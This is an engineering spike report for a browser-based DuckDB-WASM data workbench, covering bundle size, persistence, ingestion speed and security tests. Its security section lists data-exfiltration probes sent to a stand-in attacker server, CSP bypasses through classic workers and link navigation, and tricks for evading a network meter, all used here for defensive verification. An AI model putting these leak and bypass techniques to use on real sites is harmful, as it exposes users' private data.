# Spike 00 — Architectural Falsification Report (S1–S9 & R1–R3)

> **Date:** 2026-11-22  
> **Hardware:** Intel Core i5-8350U (8 threads), 7.1 GiB RAM (~3.8 GiB available), NVMe SSD  
> **Engines tested:** Chrome 157 / Playwright Chromium-1255, Firefox 154 / Playwright Firefox-1572, Playwright WebKit-2388 (`playwright-core@1.65.1`)  
> **Pinned dependencies tested:** `@duckdb/duckdb-wasm@1.33.1-dev57.0`, `apache-arrow@17.0.0`, `fflate@0.8.3`, `xlsx@0.20.3` (from `cdn.sheetjs.com`), `exceljs@4.4.0`, `fast-check@4.10.3`

All measurements below were executed empirically against synthetic fixtures in an isolated test harness simulating headerless GitHub Pages static hosting (zero custom HTTP headers) alongside a separate cross-origin attacker HTTP/WebSocket endpoint.

---

## 1. Bundle Footprint & Self-Hosted Boot (S1)

| Asset | Raw bytes | `gzip -9` bytes |
|---|---:|---:|
| `duckdb-eh.wasm` | 35,913,747 (34.25 MiB) | 8,057,777 (7.68 MiB) |
| `duckdb-browser-eh.worker.js` | 773,223 | 188,134 |
| `duckdb-mvp.wasm` | 41,325,187 (39.41 MiB) | 9,181,520 (8.76 MiB) |
| `duckdb-browser-mvp.worker.js` | 839,642 | 193,373 |
| `duckdb-coi.wasm` | 35,644,774 (34.00 MiB) | 8,125,902 (7.75 MiB) |
| `duckdb-browser-coi.worker.js` | 886,740 | 205,307 |
| `duckdb-browser-coi.pthread.worker.js` | 667,623 | 155,433 |

- **Self-hosted boot (`eh`):** Cold/warm boot with **0 external requests**: Chromium `1,170.8 / 1,058.7 ms`, Firefox `1,608 / 1,489 ms`, WebKit `2,452 / 2,003 ms`.
- **Self-hosted `blob:` boot (`R1`):** Chromium `1,322 ms`, Firefox `1,693 ms`, WebKit `2,032 ms`.

---

## 2. Privacy, CSP, and Network Meter Verification (S6a & R1)

### Failures of the original `<meta>` CSP + classic worker model
Under `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; worker-src 'self' blob:; ... connect-src 'self'; ...">` served without HTTP headers:
- **Main thread & `blob:` workers:** Cross-origin `fetch`, `XHR`, `sendBeacon`, `WebSocket`, `EventSource`, and `Image` were all blocked across Chromium, Firefox, and WebKit.
- **Classic same-origin HTTP workers (`/worker-probe.js` AND `/duckdb/duckdb-browser-eh.worker.js`):** Bypassed `<meta>` CSP completely in **Chromium, Firefox, and WebKit**. Cross-origin `fetch` (`200 OK`), `importScripts`, cross-origin `WebSocket` frames, and DuckDB `SELECT * FROM read_csv('http://127.0.0.1:4174/leak.csv')` all reached the attacker server on the wire.
- **Top-level navigation & `'self'` origin:** Clicking `<a target="_blank" href="http://127.0.0.1:4174/...">` opened and delivered query-string data to the attacker server in all 3 engines. Same-origin `fetch('/?leak=...')` succeeded under `connect-src 'self'`.
- **Network meter bypasses:** All 3 engines bypassed the meter via (1) `iframe.contentWindow.fetch(...)` (`wrapperCountObserved: 0`), (2) same-origin `WebSocket` (missed by both `window.fetch` wrapper and Service Worker `fetch` event), and (3) `navigator.serviceWorker.getRegistrations()` → `unregister()`.

### Verified Replacement (R1): `blob:`-Wrapped Workers + CSP-Safe Arrow
- Fetching same-origin worker code and instantiating via `new Worker(URL.createObjectURL(new Blob([text], { type: 'application/javascript' })))` (with absolute `location.origin` WASM URLs) **inherited `<meta>` CSP in Chromium, Firefox, and WebKit**: `SELECT 42` succeeded and `read_csv('http://127.0.0.1:4174/leak.csv')` was blocked (`0` attacker server hits across all 3 browsers).
- **CSP surprise in `apache-arrow@17.0.0`:** Running `arrow.tableFromArrays()` inside a `blob:` worker under `script-src 'self' 'wasm-unsafe-eval'` (no `'unsafe-eval'`) threw `EvalError: call to Function() blocked by CSP` in Chromium and Firefox because `apache-arrow/builder/valid.mjs` calls `new Function(...)` inside `createIsValidFunction()`. Building Arrow columns directly via `arrow.makeData` + `arrow.makeVector` bypassed `new Function()` cleanly with zero `'unsafe-eval'`.

---

## 3. OPFS Persistence & `.duckdb` Export (S2, S8, R2)

- **DuckDB `opfs://` failure (`S2`):**
  - **WebKit:** `db.open({ path: 'opfs://dewpond.db' })` failed immediately with `UnknownError: The operation failed for an unknown transient reason (e.g. out of memory).`
  - **Chromium & Firefox:** `db.open({ path: 'opfs://dewpond.db', accessMode: READ_WRITE / AUTOMATIC })`, `flushFiles()`, `dropFiles()`, and `ATTACH 'opfs://...'` all left **0-byte files** and lost **100% of tables after reload** (`tableNames: []`, `cnt: "0"`). Source inspection of `duckdb-browser-eh.worker.js` identified `prepareDBFileHandle` checking `!c && a.getSize() && await this.registerFileHandleAsync(...)`, skipping registration on newly created 0-byte OPFS files. Multi-tab exclusive lock cleanly threw `SyncAccessHandle` / `No modification allowed` errors and triggered `:memory:` fallback.
- **`.duckdb` export & `sqlite` (`S8`):**
  - `ATTACH 'export_vfs.duckdb'; COPY FROM DATABASE memory TO out_db; copyFileToBuffer(...)` threw `Error` in Chromium & Firefox; `ATTACH 'opfs://exp.duckdb'` left `NotFoundError` in OPFS.
  - `INSTALL sqlite; LOAD sqlite;` phoned `https://extensions.duckdb.org/v1.5.4/wasm_eh/sqlite_scanner.duckdb_extension.wasm` over XHR. `sql.js@1.17.0` is 31.67 MB unpacked on npm.
- **Parquet write trap in `1.33.1-dev57.0` (`R2`):**
  - `COPY orders TO 'snap.parquet' (FORMAT PARQUET)` on 50k rows threw `RuntimeError: table index is out of bounds` / `index out of bounds` / `Out of bounds call_indirect` in Chromium, Firefox, and WebKit (`COPY` on tiny 2-row tables succeeded in S6b). Thus explicit OPFS snapshots should store raw source files / Arrow IPC / Recipes (or validate Parquet export on a stable non-`dev` DuckDB-WASM release).

---

## 4. Concurrency, Cancellation, & Threaded COI Bundle (S5)

| Metric | Chromium (`eh`) | Chromium (`coi`) | Firefox (`eh`) | Firefox (`coi`) |
|---|---:|---:|---:|---:|
| Boot time | 1,332 ms | 2,587 ms | 2,015 ms | 2,761 ms |
| Read `SELECT 1` fired 200 ms into `CREATE TABLE AS` | **1,155 ms** *(blocked behind 1,354 ms write)* | **919 ms** *(blocked behind 1,118 ms write)* | **1,938 ms** *(blocked behind 2,137 ms write)* | **2,391 ms** *(blocked behind 2,590 ms write)* |
| `cancelSent()` return value (`query` & `send`) | `false` *(ran to completion)* | `false` *(ran to completion)* | `false` *(ran to completion)* | `false` *(ran to completion)* |
| 1M-row `GROUP BY` | 117 ms | 85 ms (`1.38×`) | 95 ms | 97 ms (`0.98×`) |
| 1M-row `SUMMARIZE` | 422 ms | 170 ms (`2.48×`) | 485 ms | 176 ms (`2.76×`) |

- Hard `worker.terminate()` followed immediately by reopening `opfs://` hit an OPFS `SyncAccessHandle` lock race in Chromium and lost the table in Firefox.
- **ADR-003 Decision:** Stay single-threaded `eh`/`mvp` only; treat DuckDB as strictly serialized; cache visible grid windows in JS; cancel by terminating and restarting the worker from `:memory:` + Recipe replay.

---

## 5. XLSX Ingestion Options (S3 & R3)

| Strategy | 10 MB (128k×10) | 25 MB (316k×10) | 50 MB (630k×10) | 100 MB (1.26M×10, 581 MB XML) | Fidelity & Supply-Chain Findings |
|---|---|---|---|---|---|
| **DuckDB `excel` WASM ext** | 31.2 s (Chrome) | 60.9 s (Chrome) | Failed / closed | Not run | Phones `extensions.duckdb.org`; stops at blank row 2 under merged banner (`rows: 1`) |
| **SheetJS `0.20.3`** *(CDN tarball)* | 12.5 s (Cr) / 13.3 s (FF) | 32.1 s (Cr) / 29.5 s (FF) | 66.7 s (Cr) / 63.4 s (FF) | **Failed (Cr) / Tab crash (FF)** | npm `0.18.5` has CVEs; `0.20.3` off-npm CDN; `1900` date `-1h` TZ drift; `1904` date off **4 years + 2 days** |
| **ExcelJS `4.4.0`** | 8.6 s (Cr) / 12.1 s (FF) | 24.6 s (Cr) / 31.4 s (FF) | Not run | Not run | Heavy 2.5 MB worker bundle |
| **`fflate@0.8.3` streaming ZIP + XML + direct Arrow `makeData` (`R3`)** | **6.74 s** (Cr) / **4.18 s** (FF) | **12.72 s** (Cr) / **8.64 s** (FF) | **24.76 s** (Cr) / **17.03 s** (FF) | Capped below 100 MB | **Exact `1900` & `1904` UTC dates (`2025-04-03..05`), hidden row/sheet, merges, formula cached values in 5–6 ms**; 421 KB worker bundle; MIT license |

- **ADR-009 Decision:** Build a `fflate@0.8.3` streaming ZIP + chunked XML parser in the compute worker using CSP-safe `arrow.makeData`. Warn above 25 MB and cap v1 XLSX at 50 MB (recommending CSV/Parquet above 25 MB).

---

## 6. CSV/Parquet Scale & Messy-File Ingest (S4 & E1)

### 50 MB CSV (`50.33 MiB`, 385,000 rows × 15 cols)
- **Native `read_csv_auto` + `SUMMARIZE`:** `1,395 ms` (Chromium) / `1,713 ms` (Firefox) — **silently coerced `bvn` to `BIGINT`**.
- **Materialized 2-pass (`t_raw` + full-scan SQL regex/try_cast scoring + `t_typed` + `SUMMARIZE`):** `12,883 ms` (Chromium, `14.50×` ingest ratio) / `15,253 ms` (Firefox, `14.04×` ingest ratio) — **refutes `< 5 s` and `≤ 3×`**.
- **Streaming sample-5k + single-pass `read_csv(..., all_varchar=true)` + `try_cast` + `SUMMARIZE`:** **`2,204 ms`** (Chromium, `1.96×` ingest) / **`2,120 ms`** (Firefox, `1.44×` ingest), `maxRafGapMs ≤ 17.2 ms`, 0 long tasks.

### 500 MB Scale (`500mb.csv` = 500.36 MiB / 3.8M rows; `500mb.parquet` = 506 MiB Snappy / 4.16M rows)
- **500 MB CSV:** lazy `count` `2.54 s` (Cr) / `4.08 s` (FF); lazy `GROUP BY` `2.75 s` (Cr) / `4.01 s` (FF); full `all_varchar` materialization `6.71 s` / `8.78 s` (**889.2 MB** DuckDB RAM), `maxRafGapMs ≤ 17.3 ms`, 0 crashes.
- **500 MB Parquet (`BROWSER_FILEREADER`):** `count` `2.31 s` / `4.63 s`; projected `GROUP BY` `532 ms` / `503 ms`; filtered `LIMIT 100` `267 ms` / `208 ms`; `SUMMARIZE` `8.55 s` / `9.43 s`; **4.04 MB** DuckDB RAM (`EXTERNAL_FILE_CACHE`), `maxRafGapMs ≤ 33.4 ms`.

### 17-Fixture Messy Corpus Traps
- **Native `read_csv_auto` failures:** Crashed on Windows-1252 (`08`) and mixed `\r\n`/`\n` (`11`); coerced `1.23E+10` to `DOUBLE` (`03`); guessed silently on ambiguous dates (`04`); promoted banner rows to headers (`06`); **silently dropped header + rows 1–2 (`rows=1`) on ragged rows (`13`)**.
- **2-pass prototype traps caught:**
  1. **DuckDB `try_cast('1500.50' AS BIGINT)` silently rounds to `1501` instead of returning `NULL`** (`02_eleven_digit_bvn.csv` `balance`). Candidate scoring **must** enforce strict `^[+-]?[0-9]+$` regex before accepting `BIGINT`.
  2. `11_mixed_crlf_lf.csv` and `13_ragged_rows.csv` (wider than header) fail even in `read_csv(..., all_varchar=true, null_padding=true)` unless line endings and ragged widths are normalized first in the compute worker.
  3. EU decimal inference must recognize `99,95` (comma decimal without thousands dot) as well as `1.250.000,50`.

---

## 7. Recipe Security, Determinism, & Edit Overlay (S6b, S9, E2)

- **Security primitives (`S6b`):**
  - `SET enable_external_access = false` broke `read_csv_auto('v_text.csv')`, `read_csv_auto('v_buf.csv')`, and `COPY ... TO 'out_after.csv'` (`Permission Error`). Must block external URLs/paths/functions via `sqlkit` + AST allowlist instead.
  - `conn.prepare()` fails on `CREATE OR REPLACE VIEW ... WHERE id = ?` (`Binder Error`) — view compilation must use `sqlkit.lit()`.
  - Built-ins verified offline: `sha256`, `md5`, `jaro_winkler_similarity`, `damerau_levenshtein`, `strip_accents`, `regexp_extract`, `sniff_csv`, `SUMMARIZE`, `read_json_auto`.
  - Deflate bomb: 20 MB `'A'` → 20,394 B (`1,028×` ratio), stopped cleanly via 2 MB streaming abort. DuckDB regex is RE2-safe (`3.9 ms`). Uncapped chained self-joins reached 100M pairs (`806 ms`); 20k-value `PIVOT` generated 20,001 columns (`1.74 s`).
- **Determinism & row-data leak (`E2`):**
  - `dedupe` without `, "__rid" ASC` picked different rows when physical order varied.
  - `redact` shuffle (`ORDER BY random()`) produced different outputs across runs; needs `ORDER BY sha256(seed || __rid::VARCHAR)`.
  - Serializing `setCell`, `insertRows`, and `filter` literals into `#r=` embedded `'22123456789'`, `'08012345678'`, and `'Chinedu Okafor'` in the share URL, violating the raw-data-free claim.
- **1M-row edit overlay (`S9`):**
  - Single `setCell` `INSERT`: `1.5–2.8 ms` median (`3–6.8 ms` p95). `UNIQUE` check on 1M view: `8.7–21.9 ms` median.
  - **Page read at `OFFSET 500,000`:** JS-merge `:memory:` `250–268 ms` median (`316–436 ms` p95); SQL view `:memory:` `717–753 ms`, `opfs://` `926–1,117 ms`. Consolidation (10k edits): `:memory:` `0.94–1.13 s`, `opfs://` `5.92–6.18 s`.
  - `fast-check` failed (`propOk: false`, 24th run) when `setCell` referenced an `insert` undone past `head`, and `insertAfterOrderingMismatch: true` showed monotonic `__rid` places `insertRows(after)` rows at the bottom.
  - **ADR-011 Decision:** Defer cell/row editing (Milestone M2.5) to Post-v1; when built, require keyset pagination, fractional `ord DOUBLE` ordering, and share-link exclusion.

---

## 8. Scope & Market Audit Summary

- **Scope (`TODO.md` audit):** Original pre-spike `TODO.md` totaled **137.5 timed dev-days** across S–M4 before V1's 17 untimed tasks (~7–9 months solo vs. 12-week target). Narrowed v1 cuts editing, fuzzy reconciliation review queues, `.duckdb`/SQLite, HTML reports, and COI threads.
- **Market (`H9`):** Desk research identified `duckdb -ui`, `PondPilot`, `QuackDB`, `sql-workbench.com`, `Datasette Lite`, `OpenRefine`, `Power Query`, `Modern CSV`, `VisiData`, `Tad`, and `Row Zero`. No single tool pairs verifiable browser isolation + messy-export Unmess + click-to-SQL + Diff/Redact, **but demand and browser trust require Week 1 validation via [`docs/interviews.md`](../interviews.md).**

---

## 9. Milestone W0 Technical Verification (D1 & D6)

### D1 — Name, npm, GitHub, & Domain Check (`VERIFIED` 2026-11-22)

| Asset | Target | Status | Fallback / Notes |
|---|---|---|---|
| **npm package** | `dewpond` | **Available (`404`)** | Fallback `tarn` is **taken** (`3.1.2`) |
| **GitHub org / slug** | `github.com/dewpond` | **Taken (`HTTP 200`)** | `github.com/dewpond-data` is **available (`HTTP 404`)** |
| **Domains (RDAP)** | `dewpond.app` / `dewpond.dev` | **Taken (`RDAP HTTP 200`)** | `dewpond.io` & `dewpond.org` are **available (`RDAP HTTP 404`)** |
| **Trademark overlap** | "Dewpond" | **Minor overlap** (`SOURCED`) | IT services firm "Dewpond Technologies" (`dewpondtechnologies.com`); no prominent data-workbench software found |

### D6 — Stable DuckDB-WASM Pin (`1.32.0` vs `1.30.0` vs `1.33.1-dev57.0`) (`VERIFIED`)

| Check | `1.33.1-dev57.0` | `1.32.0` *(Latest Stable)* | `1.30.0` |
|---|---|---|---|
| `duckdb-eh.wasm` raw / gz | 35.91 MB / 8.06 MB | **34.24 MB / 7.64 MB** *(+ 773 KB / 188 KB worker)* | Tested |
| `blob:` worker `<meta>` CSP (`R1`) | Blocks remote CSV (0 hits, Cr/FF/WK) | **Blocks remote CSV (0 hits, Cr/FF/WK)** | **Blocks remote CSV (0 hits, Cr/FF/WK)** |
| `opfs://dewpond.db` + `CHECKPOINT` (`S2`) | **Broken** (0 B in Cr/FF; `UnknownError` WK) | **Works in Cr & FF** (`536,576 B` DB + `129,451 B` WAL; 10k rows persist; un-checkpointed rows lost on crash; `UnknownError` in WK) | **Works in Cr & FF** (`536,576 B` DB + `129,451 B` WAL; `UnknownError` in WK) |
| **Arrow IPC OPFS snapshot (50k typed rows)** | Untested | **Works in Cr & FF** (`36–63 ms` export `1.76 MB`, `8–28 ms` OPFS write, `20–87 ms` reload; exact sums/leading zeros/dates) | **Works in Cr & FF** (`24–37 ms` export, `7–35 ms` write, `21–90 ms` reload) |
| `COPY orders (50k) TO 'snap.csv'` | Untested | **Works in Cr/FF/WK** (`1,855,057 B`) | **Works in Cr/FF/WK** (`1,855,057 B`) |
| `COPY orders (50k) TO 'snap.parquet'` | **WASM trap** (`table index out of bounds`) | **WASM trap** (`table index is out of bounds` / `Out of bounds call_indirect` in Cr/FF/WK) | **WASM trap** (`table index is out of bounds` in Cr/FF/WK) |

**D6 Decision:** Pin **`@duckdb/duckdb-wasm@1.32.0`** (with `apache-arrow@17.0.0`). Use `:memory:` DuckDB + IndexedDB Recipes + explicit Arrow IPC OPFS snapshots (or `1.32.0` `opfs://` with mandatory `CHECKPOINT`, noting Arrow IPC avoids multi-tab handle contention). **Important:** Because browser DuckDB-WASM `COPY ... TO 'out.parquet'` trapped on 50k rows across `1.30.0`, `1.32.0`, and `1.33.1-dev57.0`, Parquet export requires `parquet-wasm`/`hyparquet-writer` or a dedicated chunked-writer spike in M3 rather than assuming `COPY ... (FORMAT PARQUET)` works out of the box.
